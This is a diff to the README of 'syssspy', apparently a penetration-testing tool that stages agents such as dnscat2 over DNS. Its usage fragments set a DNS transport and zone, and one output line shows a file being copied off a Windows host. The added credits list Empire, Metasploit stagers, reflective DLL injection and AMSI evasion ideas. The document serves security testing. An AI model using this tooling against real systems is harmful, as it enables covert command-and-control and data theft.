@@ -123,7 +123,7 @@ Usage Examples
 
 Download of a file using staged DNS transport with POWERSHELL platform could look like this:
 
-```
+```raw
 $ syssspy
 syssspy> set TRANSPORT DNS
 syssspy> set ZONE zfs.sy.gs
@@ -221,7 +221,7 @@ syssspy> exit
 
 Or maybe we want to use dnscat2 for the real deal and just use syssspy to stage it:
 
-```
+```raw
 $ syssspy
 syssspy> set TRANSPORT DNS
 syssspy> set AGENTTYPE DNSCAT2
@@ -283,3 +283,45 @@ Wrote 3295 bytes from c:/Users/fsteglich/Desktop/testfile.txt to /tmp/out.txt!
 command (feynman-win7) 1> exit
 Input thread is over
 ```
+
+Inspirations
+============
+
+This project was inspired by (and shamelessly stole part of its code from):
+
+ * Empire:
+   * https://github.com/adaptivethreat/Empire/blob/master/lib/common/stagers.py
+     — generate_launcher uses a HTTP(S) stager
+   * https://github.com/adaptivethreat/Empire/tree/master/data/agent
+     — stager (step two after initial launcher) and agent (step three)
+   * https://github.com/EmpireProject/Empire/blob/master/lib/common/helpers.py
+     — powershell script generation and stipping
+
+ * Metasploit:
+   * https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmdstager.rb
+     — CmdStager for bourne, ...
+
+ * ReflectiveDLLInjection:
+   * https://github.com/stephenfewer/ReflectiveDLLInjection
+ 
+ * p0wnedShell:
+   * https://github.com/Cn33liz/p0wnedShell
+     — some ideas for AMSI evation for future use
+ 
+ * dnscat2:
+   * https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md
+     — ideas on protocol design over DNS
+   * https://github.com/lukebaggett/dnscat2-powershell/blob/master/dnscat2.ps1
+     — powershell version of the dnscat2 agent
+  
+ * SySS-PoC-RAT from Matthias:
+   * https://git.syss.intern/syss-poc-rat
+     — for future implementation of transport module HTTP(S)
+ 
+ * Adrians ideas on DNS backchanneling:
+   * https://wiki.syss.intern/hackerwiki/index.php/DNS_Backchannel
+     — for future implementation of platform module bash
+ 
+ * dnsftp
+   * https://github.com/breenmachine/dnsftp
+     — short script parts for stagers via DNS
